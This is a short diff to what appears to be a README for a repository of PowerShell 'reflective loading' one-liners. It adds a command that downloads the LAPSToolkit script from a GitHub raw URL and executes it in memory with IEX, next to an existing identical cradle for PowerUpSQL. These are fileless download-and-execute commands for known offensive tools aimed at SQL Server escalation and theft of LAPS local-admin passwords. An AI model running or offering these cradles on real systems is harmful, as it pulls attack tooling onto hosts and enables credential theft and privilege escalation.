@@ -15,3 +15,8 @@ PowerUpSQL
 ```powershell
 (new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/wez3/reflective-loading/main/PowerUpSQL.ps1') | IEX
 ```
+
+LAPSToolkit
+```powershell
+(new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/wez3/reflective-loading/main/LAPSToolkit.ps1') | IEX
+```
